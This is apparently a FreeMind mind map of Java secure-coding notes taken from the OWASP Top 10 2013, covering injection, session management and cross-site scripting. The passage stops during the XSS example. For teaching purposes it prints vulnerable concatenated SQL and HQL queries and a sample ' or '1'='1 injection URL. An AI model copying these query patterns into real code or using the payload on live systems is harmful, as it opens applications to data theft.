<map version="0.9.0">
<!-- To view this file, download free mind mapping software FreeMind from http://freemind.sourceforge.net -->
<node CREATED="1395211397050" ID="ID_1055982131" MODIFIED="1395211407213" TEXT="Java secure coding ">
<node CREATED="1395211417246" FOLDED="true" ID="ID_934958949" MODIFIED="1395310801642" POSITION="right" TEXT="Owasp top 10">
<node CREATED="1395211447301" FOLDED="true" ID="ID_264721596" LINK="https://www.owasp.org/index.php/Top_10_2013-A1-Injection" MODIFIED="1395228764169" TEXT="A1-Injection">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<icon BUILTIN="full-1"/>
<node CREATED="1395211746138" ID="ID_1633347995" MODIFIED="1395211750650">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <img src="A1-injecttion.png" />
  </body>
</html></richcontent>
</node>
<node CREATED="1395224979975" FOLDED="true" ID="ID_567791244" MODIFIED="1395225026600" TEXT="example">
<node CREATED="1395224984704" ID="ID_1957739134" MODIFIED="1395224991912">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <div style="font-variant: normal; font-family: sans-serif; text-transform: none; margin-bottom: 3px; white-space: normal; letter-spacing: normal; text-align: left; border-bottom-color: rgb(153, 153, 153); line-height: 19.200000762939453px; color: rgb(0, 0, 0); font-weight: normal; font-size: 19px; text-indent: 0px; word-spacing: 0px; font-style: normal; border-bottom-style: solid; border-bottom-width: 1px; padding-bottom: 3px">
      <font size="3">Example Attack Scenarios </font>
    </div>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <font size="3"><b>Scenario #1:</b>&#160;The application uses untrusted data in the construction of the following<b>vulnerable</b>&#160;SQL call: </font>
    </p>
    <div style="font-variant: normal; font-family: courier; padding-left: 4px; margin-right: 20px; background-color: rgb(224, 224, 224); padding-top: 4px; text-transform: none; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; font-weight: normal; color: rgb(0, 0, 0); margin-left: 20px; font-size: 13px; padding-right: 4px; text-indent: 0px; word-spacing: 0px; font-style: normal; padding-bottom: 4px">
      <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
        <font size="3">String query = &quot;SELECT * FROM accounts WHERE custID='&quot; + request.getParameter(&quot;id&quot;) + &quot;'&quot;; </font>
      </p>
    </div>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <font size="3"><b>Scenario #2:</b>&#160;Similarly, an application&#8217;s blind trust in frameworks may result in queries that are still vulnerable, (e.g., Hibernate Query Language (HQL)): </font>
    </p>
    <div style="font-variant: normal; font-family: courier; padding-left: 4px; margin-right: 20px; background-color: rgb(224, 224, 224); padding-top: 4px; text-transform: none; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; font-weight: normal; color: rgb(0, 0, 0); margin-left: 20px; font-size: 13px; padding-right: 4px; text-indent: 0px; word-spacing: 0px; font-style: normal; padding-bottom: 4px">
      <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
        <font size="3">Query HQLQuery = session.createQuery(&#8220;FROM accounts WHERE custID='&#8220; + request.getParameter(&quot;id&quot;) + &quot;'&quot;); </font>
      </p>
    </div>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <font size="3">In both cases, the attacker modifies the &#8216;id&#8217; parameter value in her browser to send:&#160;</font><font color="red" size="3">' or '1'='1</font><font size="3">. For example: </font>
    </p>
    <div style="font-variant: normal; font-family: courier; padding-left: 4px; margin-right: 20px; background-color: rgb(224, 224, 224); padding-top: 4px; text-transform: none; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; font-weight: normal; color: rgb(0, 0, 0); margin-left: 20px; font-size: 13px; padding-right: 4px; text-indent: 0px; word-spacing: 0px; font-style: normal; padding-bottom: 4px">
      <font color="red" size="3">http://example.com/app/accountView?id=' or '1'='1</font>
    </div>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <font size="3">This changes the meaning of both queries to return all the records from the accounts table. More dangerous attacks could modify data or even invoke stored procedures. </font>
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node CREATED="1395225027395" FOLDED="true" ID="ID_1101905398" MODIFIED="1395225221673" TEXT="prevention">
<node CREATED="1395225036633" ID="ID_429279861" MODIFIED="1395225050862">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <div style="font-variant: normal; font-family: sans-serif; text-transform: none; margin-bottom: 3px; white-space: normal; letter-spacing: normal; text-align: left; border-bottom-color: rgb(153, 153, 153); line-height: 19.200000762939453px; color: rgb(0, 0, 0); font-weight: normal; font-size: 19px; text-indent: 0px; word-spacing: 0px; font-style: normal; border-bottom-style: solid; border-bottom-width: 1px; padding-bottom: 3px">
      <font size="3">How Do I Prevent 'Injection'? </font>
    </div>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <font size="3">Preventing injection requires keeping untrusted data separate from commands and queries. </font>
    </p>
    <ol>
      <li>
        <font size="3">The preferred option is to use a safe API which avoids the use of the interpreter entirely or provides a parameterized interface. Be careful with APIs, such as stored procedures, that are parameterized, but can still introduce injection under the hood. </font>
      </li>
      <li style="margin-bottom: 0">
        <font size="3">If a parameterized API is not available, you should carefully escape special characters using the specific escape syntax for that interpreter.&#160;</font><font color="rgb(102, 51, 102)" size="3"><a rel="nofollow" href="https://www.owasp.org/index.php/ESAPI" class="external text" style="text-decoration: none; background-repeat: repeat; color: rgb(102, 51, 102); padding-right: 13px; background-position: 100% 50%; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAdUlEQVQYV2P4//8/Awxv3LThf0dXKxyD+DA5DEUg+tWrV2AaWTFcIboJyJrhCtGtRMcgebhpL2/4/v//Lvn//x+7IRjIfn8v+P/t055gxZgKPzaC8Y/nMYQVLpnM8f/zo3AqKfzyOOL/h/sh/59c9sBUSIyvAeRdJWjk4E//AAAAAElFTkSuQmCC)">OWASP&#8217;s ESAPI</a></font><font size="3">&#160;provides many of these&#160;</font><font size="3" color="rgb(102, 51, 102)"><a rel="nofollow" href="http://owasp-esapi-java.googlecode.com/svn/trunk_doc/latest/org/owasp/esapi/Encoder.html" class="external text" style="text-decoration: none; background-repeat: repeat; color: rgb(102, 51, 102); padding-right: 13px; background-position: 100% 50%; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAVklEQVR4Xn3PgQkAMQhDUXfqTu7kTtkpd5RA8AInfArtQ2iRXFWT2QedAfttj2FsPIOE1eCOlEuoWWjgzYaB/IkeGOrxXhqB+uA9Bfcm0lAZuh+YIeAD+cAqSz4kCMUAAAAASUVORK5CYII=)">escaping routines</a></font><font size="3">. </font>
      </li>
      <li style="margin-bottom: 0">
        <font size="3">Positive or &#8220;white list&#8221; input validation is also recommended, but is not a complete defense as many applications require special characters in their input. If special characters are required, only approaches 1. and 2. above will make their use safe.</font><font size="3" color="rgb(102, 51, 102)"><a rel="nofollow" href="https://www.owasp.org/index.php/ESAPI" class="external text" style="text-decoration: none; background-repeat: repeat; color: rgb(102, 51, 102); padding-right: 13px; background-position: 100% 50%; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAdUlEQVQYV2P4//8/Awxv3LThf0dXKxyD+DA5DEUg+tWrV2AaWTFcIboJyJrhCtGtRMcgebhpL2/4/v//Lvn//x+7IRjIfn8v+P/t055gxZgKPzaC8Y/nMYQVLpnM8f/zo3AqKfzyOOL/h/sh/59c9sBUSIyvAeRdJWjk4E//AAAAAElFTkSuQmCC)">OWASP&#8217;s ESAPI</a></font><font size="3">&#160;has an extensible library of&#160;</font><font size="3" color="rgb(102, 51, 102)"><a rel="nofollow" href="http://owasp-esapi-java.googlecode.com/svn/trunk_doc/latest/org/owasp/esapi/Validator.html" class="external text" style="text-decoration: none; background-repeat: repeat; color: rgb(102, 51, 102); padding-right: 13px; background-position: 100% 50%; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAVklEQVR4Xn3PgQkAMQhDUXfqTu7kTtkpd5RA8AInfArtQ2iRXFWT2QedAfttj2FsPIOE1eCOlEuoWWjgzYaB/IkeGOrxXhqB+uA9Bfcm0lAZuh+YIeAD+cAqSz4kCMUAAAAASUVORK5CYII=)">white list input validation routines</a></font><font size="3">. </font>
      </li>
    </ol>
  </body>
</html></richcontent>
</node>
</node>
<node CREATED="1395225222484" ID="ID_446897880" MODIFIED="1395225232906" TEXT="Types are ">
<node CREATED="1395225232907" ID="ID_1995392984" MODIFIED="1395225275480" TEXT="SQL, OS, XPATH, XML, LDAP, HTMl, XSLT"/>
</node>
</node>
<node CREATED="1395211798520" FOLDED="true" ID="ID_717424985" LINK="https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management" MODIFIED="1395224447140" TEXT="A2-Broken Authentication and Session Management">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<icon BUILTIN="full-2"/>
<node CREATED="1395211983150" ID="ID_1288341014" MODIFIED="1395211986418">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <img src="A2-BrokenAuthentication.png" />
  </body>
</html></richcontent>
</node>
<node CREATED="1395215532756" FOLDED="true" ID="ID_479646277" MODIFIED="1395215562672" TEXT="Am I Vulnerable To &apos;Broken Authentication and Session Management&apos;? ">
<node CREATED="1395215439914" ID="ID_1035168287" MODIFIED="1395215483606">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <div style="font-variant: normal; font-family: sans-serif; text-transform: none; margin-bottom: 3px; white-space: normal; letter-spacing: normal; text-align: left; border-bottom-color: rgb(153, 153, 153); line-height: 19.200000762939453px; color: rgb(0, 0, 0); font-weight: normal; font-size: 19px; text-indent: 0px; word-spacing: 0px; font-style: normal; border-bottom-style: solid; border-bottom-width: 1px; padding-bottom: 3px">
      <font color="#ff3300" size="3"><b>Am I Vulnerable To 'Broken Authentication and Session Management'? </b></font>
    </div>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <font size="3">Are session management assets like user credentials and session IDs properly protected? You may be vulnerable if: </font>
    </p>
    <ol style="font-variant: normal; font-family: sans-serif; padding-left: 0px; margin-right: 0px; padding-top: 0px; text-transform: none; margin-bottom: 0px; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; list-style-image: none; margin-top: 0; color: rgb(0, 0, 0); font-weight: normal; margin-left: 0; padding-right: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal; padding-bottom: 0px">
      <li style="margin-bottom: 0">
        <font size="3">User authentication credentials aren&#8217;t protected when stored using hashing or encryption. See A6. </font>
      </li>
      <li style="margin-bottom: 0">
        <font size="3">Credentials can be guessed or overwritten through weak account management functions (e.g., account creation, change password, recover password, weak session IDs). </font>
      </li>
      <li style="margin-bottom: 0">
        <font size="3">Session IDs are exposed in the URL (e.g., URL rewriting). </font>
      </li>
      <li style="margin-bottom: 0">
        <font size="3">Session IDs are vulnerable to&#160;</font><font color="rgb(102, 51, 102)" size="3"><a rel="nofollow" href="https://www.owasp.org/index.php/Session_fixation" class="external text" style="text-decoration: none; background-repeat: repeat; color: rgb(102, 51, 102); padding-right: 13px; background-position: 100% 50%; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAdUlEQVQYV2P4//8/Awxv3LThf0dXKxyD+DA5DEUg+tWrV2AaWTFcIboJyJrhCtGtRMcgebhpL2/4/v//Lvn//x+7IRjIfn8v+P/t055gxZgKPzaC8Y/nMYQVLpnM8f/zo3AqKfzyOOL/h/sh/59c9sBUSIyvAeRdJWjk4E//AAAAAElFTkSuQmCC)">session fixation</a></font><font size="3">&#160;attacks. </font>
      </li>
      <li style="margin-bottom: 0">
        <font size="3">Session IDs don&#8217;t timeout, or user sessions or authentication tokens, particularly single sign-on (SSO) tokens, aren&#8217;t properly invalidated during logout. </font>
      </li>
      <li style="margin-bottom: 0">
        <font size="3">Session IDs aren&#8217;t rotated after successful login. </font>
      </li>
      <li style="margin-bottom: 0">
        <font size="3">Passwords, session IDs, and other credentials are sent over unencrypted connections. See A6. </font>
      </li>
    </ol>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <font size="3">See the&#160;</font><font size="3" color="rgb(102, 51, 102)"><a rel="nofollow" href="https://www.owasp.org/index.php/ASVS" class="external text" style="text-decoration: none; background-repeat: repeat; color: rgb(102, 51, 102); padding-right: 13px; background-position: 100% 50%; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAdUlEQVQYV2P4//8/Awxv3LThf0dXKxyD+DA5DEUg+tWrV2AaWTFcIboJyJrhCtGtRMcgebhpL2/4/v//Lvn//x+7IRjIfn8v+P/t055gxZgKPzaC8Y/nMYQVLpnM8f/zo3AqKfzyOOL/h/sh/59c9sBUSIyvAeRdJWjk4E//AAAAAElFTkSuQmCC)">ASVS</a></font><font size="3">&#160;requirement areas V2 and V3 for more details. </font>
    </p>
    <font size="3"><br size="3" class="Apple-interchange-newline" />
    </font>
  </body>
</html></richcontent>
</node>
</node>
<node CREATED="1395215509293" FOLDED="true" ID="ID_1386337493" MODIFIED="1395215521136" TEXT="attack example ">
<node CREATED="1395215515076" ID="ID_994844407" MODIFIED="1395215518963">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <div style="font-variant: normal; font-family: sans-serif; text-transform: none; margin-bottom: 3px; white-space: normal; letter-spacing: normal; text-align: left; border-bottom-color: rgb(153, 153, 153); line-height: 19.200000762939453px; color: rgb(0, 0, 0); font-weight: normal; font-size: 19px; text-indent: 0px; word-spacing: 0px; font-style: normal; border-bottom-style: solid; border-bottom-width: 1px; padding-bottom: 3px">
      Example Attack Scenarios
    </div>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <b>Scenario #1:</b><span class="Apple-converted-space">&#160;</span>Airline reservations application supports URL rewriting, putting session IDs in the URL:
    </p>
    <div style="font-variant: normal; font-family: courier; padding-left: 4px; margin-right: 20px; background-color: rgb(224, 224, 224); padding-top: 4px; text-transform: none; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; font-weight: normal; color: rgb(0, 0, 0); margin-left: 20px; font-size: 13px; padding-right: 4px; text-indent: 0px; word-spacing: 0px; font-style: normal; padding-bottom: 4px">
      http://example.com/sale/saleitems

      <dl style="margin-bottom: 0; margin-top: 0">
        <dt style="font-weight: bold; margin-bottom: 0">
          jsessionid=2P0OC2JSNDLPSKHCJUN2JV
        </dt>
      </dl>
      <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
        ?dest=Hawaii
      </p>
    </div>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      An authenticated user of the site wants to let his friends know about the sale. He e-mails the above link without knowing he is also giving away his session ID. When his friends use the link they will use his session and credit card.
    </p>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <b>Scenario #2:</b><span class="Apple-converted-space">&#160;</span>Application&#8217;s timeouts aren&#8217;t set properly. User uses a public computer to access site. Instead of selecting &#8220;logout&#8221; the user simply closes the browser tab and walks away. Attacker uses the same browser an hour later, and that browser is still authenticated.
    </p>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <b>Scenario #3:</b><span class="Apple-converted-space">&#160;</span>Insider or external attacker gains access to the system&#8217;s password database. User passwords are not properly hashed, exposing every users&#8217; password to the attacker.
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node CREATED="1395215573694" ID="ID_679893213" MODIFIED="1395215576978" TEXT="prevention">
<node CREATED="1395215577893" ID="ID_432968325" MODIFIED="1395215595482">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <div style="font-variant: normal; font-family: sans-serif; text-transform: none; margin-bottom: 3px; white-space: normal; letter-spacing: normal; text-align: left; border-bottom-color: rgb(153, 153, 153); line-height: 19.200000762939453px; color: rgb(0, 0, 0); font-weight: normal; font-size: 19px; text-indent: 0px; word-spacing: 0px; font-style: normal; border-bottom-style: solid; border-bottom-width: 1px; padding-bottom: 3px">
      <font size="4"><b>How Do I Prevent 'Broken Authentication and Session Management'?</b></font>
    </div>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <font size="3">The primary recommendation for an organization is to make available to developers: </font>
    </p>
    <ol style="font-variant: normal; font-family: sans-serif; padding-left: 0px; margin-right: 0px; padding-top: 0px; text-transform: none; margin-bottom: 0px; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; list-style-image: none; margin-top: 0; color: rgb(0, 0, 0); font-weight: normal; margin-left: 0; padding-right: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal; padding-bottom: 0px">
      <li style="margin-bottom: 0">
        <font size="3"><b>A single set of strong authentication and session management controls.</b>&#160;Such controls should strive to: </font>

        <ol style="line-height: 1.5em; padding-left: 0px; margin-top: 0; margin-bottom: 0px; list-style-image: none; padding-right: 0px; margin-right: 0px; padding-bottom: 0px; padding-top: 0px; margin-left: 0">
          <li style="margin-bottom: 0">
            <font size="3">meet all the authentication and session management requirements defined in OWASP&#8217;s&#160;</font><font color="rgb(102, 51, 102)" size="3"><a rel="nofollow" href="https://www.owasp.org/index.php/ASVS" class="external text" style="text-decoration: none; background-repeat: repeat; color: rgb(102, 51, 102); padding-right: 13px; background-position: 100% 50%; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAdUlEQVQYV2P4//8/Awxv3LThf0dXKxyD+DA5DEUg+tWrV2AaWTFcIboJyJrhCtGtRMcgebhpL2/4/v//Lvn//x+7IRjIfn8v+P/t055gxZgKPzaC8Y/nMYQVLpnM8f/zo3AqKfzyOOL/h/sh/59c9sBUSIyvAeRdJWjk4E//AAAAAElFTkSuQmCC)">Application Security Verification Standard</a></font><font size="3">&#160;(ASVS) areas V2 (Authentication) and V3 (Session Management). </font>
          </li>
          <li style="margin-bottom: 0">
            <font size="3">have a simple interface for developers. Consider the&#160;</font><font size="3" color="rgb(102, 51, 102)"><a rel="nofollow" href="http://owasp-esapi-java.googlecode.com/svn/trunk_doc/latest/org/owasp/esapi/Authenticator.html" class="external text" style="text-decoration: none; background-repeat: repeat; color: rgb(102, 51, 102); padding-right: 13px; background-position: 100% 50%; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAVklEQVR4Xn3PgQkAMQhDUXfqTu7kTtkpd5RA8AInfArtQ2iRXFWT2QedAfttj2FsPIOE1eCOlEuoWWjgzYaB/IkeGOrxXhqB+uA9Bfcm0lAZuh+YIeAD+cAqSz4kCMUAAAAASUVORK5CYII=)">ESAPI Authenticator and User APIs</a></font><font size="3">&#160;as good examples to emulate, use, or build upon. </font>
          </li>
        </ol>
      </li>
      <li style="margin-bottom: 0">
        <font size="3">Strong efforts should also be made to avoid XSS flaws which can be used to steal session IDs. See A3.</font>
      </li>
    </ol>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node CREATED="1395224094617" FOLDED="true" ID="ID_1419650107" LINK="https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)" MODIFIED="1395293672567" TEXT="Cross site scripting">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<icon BUILTIN="full-3"/>
<node CREATED="1395224136496" FOLDED="true" ID="ID_338026979" MODIFIED="1395224450463" TEXT="def">
<node CREATED="1395224181897" ID="ID_274000235" MODIFIED="1395224184794">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <p>
      <font size="13px" color="rgb(0, 0, 0)" face="sans-serif"><span style="font-variant: normal; font-family: sans-serif; background-color: rgb(242, 242, 242); text-transform: none; display: inline !important; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; float: none; font-weight: normal; color: rgb(0, 0, 0); font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">XSS flaws occur whenever an application takes untrusted data and sends it to a web browser without proper validation or escaping. XSS allows attackers to execute scripts in the victim&#8217;s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.</span></font>
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node CREATED="1395224511596" ID="ID_770294124" MODIFIED="1395228583060" TEXT="prevention">
<node CREATED="1395224515809" ID="ID_901828434" MODIFIED="1395224538594">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <div style="font-variant: normal; font-family: sans-serif; text-transform: none; margin-bottom: 3px; white-space: normal; letter-spacing: normal; text-align: left; border-bottom-color: rgb(153, 153, 153); line-height: 19.200000762939453px; color: rgb(0, 0, 0); font-weight: normal; font-size: 19px; text-indent: 0px; word-spacing: 0px; font-style: normal; border-bottom-style: solid; border-bottom-width: 1px; padding-bottom: 3px">
      <font size="3">How Do I Prevent 'Cross-Site Scripting (XSS)'? </font>
    </div>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <font size="3">Preventing XSS requires separation of untrusted data from active browser content. </font>
    </p>
    <ol>
      <li>
        <font size="3">The preferred option is to properly escape all untrusted data based on the HTML context (body, attribute, JavaScript, CSS, or URL) that the data will be placed into. See the&#160;</font><font color="rgb(102, 51, 102)" size="3"><a rel="nofollow" href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" class="external text" style="text-decoration: none; background-repeat: repeat; color: rgb(102, 51, 102); padding-right: 13px; background-position: 100% 50%; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAdUlEQVQYV2P4//8/Awxv3LThf0dXKxyD+DA5DEUg+tWrV2AaWTFcIboJyJrhCtGtRMcgebhpL2/4/v//Lvn//x+7IRjIfn8v+P/t055gxZgKPzaC8Y/nMYQVLpnM8f/zo3AqKfzyOOL/h/sh/59c9sBUSIyvAeRdJWjk4E//AAAAAElFTkSuQmCC)">OWASP XSS Prevention Cheat Sheet</a></font><font size="3">&#160;for details on the required data escaping techniques. </font>
      </li>
      <li style="margin-bottom: 0">
        <font size="3">Positive or &#8220;whitelist&#8221; input validation is also recommended as it helps protect against XSS, but is&#160;<u>not a complete defense</u>&#160;as many applications require special characters in their input. Such validation should, as much as possible, validate the length, characters, format, and business rules on that data before accepting the input. </font>
      </li>
      <li style="margin-bottom: 0">
        <font size="3">For rich content, consider auto-sanitization libraries like OWASP&#8217;s&#160;</font><font size="3" color="rgb(102, 51, 102)"><a rel="nofollow" href="https://www.owasp.org/index.php/AntiSamy" class="external text" style="text-decoration: none; background-repeat: repeat; color: rgb(102, 51, 102); padding-right: 13px; background-position: 100% 50%; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAdUlEQVQYV2P4//8/Awxv3LThf0dXKxyD+DA5DEUg+tWrV2AaWTFcIboJyJrhCtGtRMcgebhpL2/4/v//Lvn//x+7IRjIfn8v+P/t055gxZgKPzaC8Y/nMYQVLpnM8f/zo3AqKfzyOOL/h/sh/59c9sBUSIyvAeRdJWjk4E//AAAAAElFTkSuQmCC)">AntiSamy</a></font><font size="3">&#160;or the</font><font size="3" color="rgb(102, 51, 102)"><a rel="nofollow" href="https://www.owasp.org/index.php/OWASP_Java_HTML_Sanitizer_Project" class="external text" style="text-decoration: none; background-repeat: repeat; color: rgb(102, 51, 102); padding-right: 13px; background-position: 100% 50%; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAdUlEQVQYV2P4//8/Awxv3LThf0dXKxyD+DA5DEUg+tWrV2AaWTFcIboJyJrhCtGtRMcgebhpL2/4/v//Lvn//x+7IRjIfn8v+P/t055gxZgKPzaC8Y/nMYQVLpnM8f/zo3AqKfzyOOL/h/sh/59c9sBUSIyvAeRdJWjk4E//AAAAAElFTkSuQmCC)">Java HTML Sanitizer Project</a></font><font size="3">. </font>
      </li>
      <li style="margin-bottom: 0">
        <font size="3">Consider&#160;</font><font size="3" color="rgb(102, 51, 102)"><a rel="nofollow" href="https://www.owasp.org/index.php/Content_Security_Policy" class="external text" style="text-decoration: none; background-repeat: repeat; color: rgb(102, 51, 102); padding-right: 13px; background-position: 100% 50%; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAdUlEQVQYV2P4//8/Awxv3LThf0dXKxyD+DA5DEUg+tWrV2AaWTFcIboJyJrhCtGtRMcgebhpL2/4/v//Lvn//x+7IRjIfn8v+P/t055gxZgKPzaC8Y/nMYQVLpnM8f/zo3AqKfzyOOL/h/sh/59c9sBUSIyvAeRdJWjk4E//AAAAAElFTkSuQmCC)">Content Security Policy (CSP)</a></font><font size="3">&#160;to defend against XSS across your entire site. </font>
      </li>
    </ol>
  </body>
</html></richcontent>
</node>
<node CREATED="1395228595979" ID="ID_1686174740" MODIFIED="1395228597035" TEXT="An encoding scheme such as HTML encoding ensures the data will be displayed as content rather than executed as code."/>
</node>
<node CREATED="1395224615867" FOLDED="true" ID="ID_732087711" MODIFIED="1395224649705" TEXT="example">
<node CREATED="1395224624066" ID="ID_751890740" MODIFIED="1395224630916">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <div style="font-variant: normal; font-family: sans-serif; text-transform: none; margin-bottom: 3px; white-space: normal; letter-spacing: normal; text-align: left; border-bottom-color: rgb(153, 153, 153); line-height: 19.200000762939453px; color: rgb(0, 0, 0); font-weight: normal; font-size: 19px; text-indent: 0px; word-spacing: 0px; font-style: normal; border-bottom-style: solid; border-bottom-width: 1px; padding-bottom: 3px">
      <font size="3">Example Attack Scenarios </font>
    </div>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <font size="3">The application uses untrusted data in the construction of the following HTML snippet without validation or escaping: </font>
    </p>
